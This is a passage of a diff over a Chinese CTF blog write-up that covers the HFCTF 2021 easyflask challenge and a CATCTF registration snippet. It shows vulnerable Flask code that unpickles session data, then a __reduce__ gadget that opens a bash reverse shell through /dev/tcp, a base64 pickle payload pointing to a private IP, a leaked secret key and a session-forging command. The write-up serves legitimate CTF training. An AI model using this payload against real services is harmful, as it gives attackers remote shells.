admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_handler</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_handler</span>():</span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_handler</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div>
 
 <p>看到<code>session.get(&#39;u&#39;)</code>是要伪造session了，但SECRET_KEY没给；</p>
 <p><code>/file</code>路由可以读文件，好东西</p>
@@ -753,7 +660,7 @@
                      data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202401261233560.png"
                       alt="image-20240126123313689"
                 ></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:session=eyJ1Ijp7IiBiIjoiZ0FTVkdBQUFBQUFBQUFDTUNGOWZiV0ZwYmw5ZmxJd0VWWE5sY3BTVGxDbUJsQzQ9In19.ZbM0jw.rFHaQ1XnVozocJQREuSTDyNqEVA</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:session=eyJ1Ijp7IiBiIjoiZ0FTVkdBQUFBQUFBQUFDTUNGOWZiV0ZwYmw5ZmxJd0VWWE5sY3BTVGxDbUJsQzQ9In19.ZbM0jw.rFHaQ1XnVozocJQREuSTDyNqEVA</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
@@ -768,18 +675,18 @@
                       alt="image-20240126143508012"
                 ></p>
 <p>Base64解码后能看到User，可以想到session应该是从User变来的</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
 
 <p>可以在session中的User里加上<code>__reduce__</code>，利用该魔术方法在执行<code>u = pickle.loads(u)</code>时执行<code>__reduce__</code>，反弹shell</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (os.system,(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&#x27;&quot;</span>,))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (os.system,(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&#x27;&quot;</span>,))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
 
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lambda 定义一个匿名函数，将其赋值给变量，通过这个变量间接调用该函数</span><br><span class="line">bash -c [command] //执行命令</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lambda 定义一个匿名函数，将其赋值给变量，通过这个变量间接调用该函数</span><br><span class="line">bash -c [command] //执行命令</span><br></pre></td></tr></table></figure></div>
 
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_handler</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_handler</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br></pre></td></tr></table></figure></div>
 
 <p>经过代码审计，在<code>/admin</code>路由下，session→u→b应为User先序列化，再Base64编码</p>
 <p>故session 未编码时：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;u&quot;:&#123;&quot; b&quot;:&quot;Y3Bvc2l4CnN5c3RlbQpwMAooUyJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTIuMTMxLzIzMzMgMD4mMSciCnAxCnRwMgpScDMKLg==&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;u&quot;:&#123;&quot; b&quot;:&quot;Y3Bvc2l4CnN5c3RlbQpwMAooUyJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTIuMTMxLzIzMzMgMD4mMSciCnAxCnRwMgpScDMKLg==&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
 
 <ul>
 <li><p>伪造session还需要有SECRET_KEY</p>
@@ -792,12 +699,12 @@
                 ></p>
 </li>
 </ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh</span><br></pre></td></tr></table></figure></div>
 
 <ul>
 <li><p>session 的伪造</p>
 <p>脚本助力</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 session.py encode -s &#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27; -t &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;Y3Bvc2l4CnN5c3RlbQpwMAooUyJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTIuMTMxLzIzMzMgMD4mMSciCnAxCnRwMgpScDMKLg==&#x27;&#125;&#125;&quot;</span><br><span class="line">//注意引号</span><br></pre></td></tr></table></figure></div></li>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 session.py encode -s &#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27; -t &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;Y3Bvc2l4CnN5c3RlbQpwMAooUyJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTIuMTMxLzIzMzMgMD4mMSciCnAxCnRwMgpScDMKLg==&#x27;&#125;&#125;&quot;</span><br><span class="line">//注意引号</span><br></pre></td></tr></table></figure></div></li>
 </ul>
 <p><img  
                      lazyload
@@ -829,15 +736,15 @@
                      data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202401281417197.png"
                       alt="image-20240128141723071"
                 ></p>
-<h5 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h5><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">let</span> user = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>)  <span class="comment">// 把输入的账号密码从json字符串转成对象</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!user.<span class="property">username</span> || !user.<span class="property">password</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;empty username or password&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">filter</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> == user.<span class="property">username</span>).<span class="property">length</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;username already exists&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// isAdmin是否true 与 邀请码是不是等于这个常量，所以sql注入没用，邀请码是个常量</span></span><br><span class="line">    <span class="keyword">if</span> (user.<span class="property">isAdmin</span> &amp;&amp; user.<span class="property">inviteCode</span> != <span class="variable constant_">INVITE_CODE</span>) &#123;</span><br><span class="line">        user.<span class="property">isAdmin</span> = <span class="literal">false</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;invalid invite code&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 使用系统函数复制对象，打包成一个新的对象</span></span><br><span class="line">    <span class="keyword">let</span> newUser = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, baseUser, user)</span><br><span class="line">    users.<span class="title function_">push</span>(newUser)  <span class="comment">// 存到总对象里</span></span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;user created successfully&#x27;</span>, <span class="attr">err</span>: <span class="literal">false</span> &#125;)  <span class="comment">// 设置返回信息</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
+<h5 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h5><div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">let</span> user = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>)  <span class="comment">// 把输入的账号密码从json字符串转成对象</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!user.<span class="property">username</span> || !user.<span class="property">password</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;empty username or password&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">filter</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> == user.<span class="property">username</span>).<span class="property">length</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;username already exists&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// isAdmin是否true 与 邀请码是不是等于这个常量，所以sql注入没用，邀请码是个常量</span></span><br><span class="line">    <span class="keyword">if</span> (user.<span class="property">isAdmin</span> &amp;&amp; user.<span class="property">inviteCode</span> != <span class="variable constant_">INVITE_CODE</span>) &#123;</span><br><span class="line">        user.<span class="property">isAdmin</span> = <span class="literal">false</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;invalid invite code&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 使用系统函数复制对象，打包成一个新的对象</span></span><br><span class="line">    <span class="keyword">let</span> newUser = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, baseUser, user)</span><br><span class="line">    users.<span class="title function_">push</span>(newUser)  <span class="comment">// 存到总对象里</span></span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;user created successfully&#x27;</span>, <span class="attr">err</span>: <span class="literal">false</span> &#125;)  <span class="comment">// 设置返回信息</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
 
 
 
-        </div>
+		</div>
 
-        
-            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
-                <div class="article-copyright-info-container">
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
     <ul>
         <li><strong>Title:</strong> 寒假training-1</li>
         <li><strong>Author:</strong> dawn_r1sing</li>
@@ -865,92 +772,80 @@
     </ul>
 </div>
 
-            </div>
-        
+		</div>
+		
 
-        
-            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
-                
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/CTF-web/">#CTF web</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/%E9%9B%86%E8%AE%AD/">#集训</a>&nbsp;
-                    </li>
-                
-            </ul>
-        
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/CTF-web/">#CTF web</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E9%9B%86%E8%AE%AD/">#集训</a>&nbsp;
+			</li>
+			
+		</ul>
+		
 
-        
+		
 
-        
-            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
-                
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2024/04/07/%E5%AF%92%E5%81%87training-2/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">寒假training-2</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="next"
-                        rel="next"
-                        href="/2024/04/07/unzip/"
-                        >
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">unzip</span>
-                                <span class="post-nav-item">Next posts</span>
-                            </span>
-                            <span class="right arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2024/04/07/%E5%AF%92%E5%81%87training-2/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">寒假training-2</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2024/04/07/unzip/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">unzip</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
 
 
-        
-    </div>
+		
+	</div>
 
-    
-        <div class="toc-content-container">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <div class="toc-title">On this page</div>
-        <div class="page-title">寒假training-1</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AF%92%E5%81%87week-1"><span class="nav-text">寒假week 1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PwnThyBytes-2019-Baby-SQL"><span class="nav-text">[PwnThyBytes 2019]Baby_SQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#very-easy-sql"><span class="nav-text">very_easy_sql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HFCTF-2021-Final-easyflask"><span class="nav-text">[HFCTF 2021 Final]easyflask</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CATCTF-wife-wife"><span class="nav-text">CATCTF wife_wife</span></a></li></ol></li></ol>
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
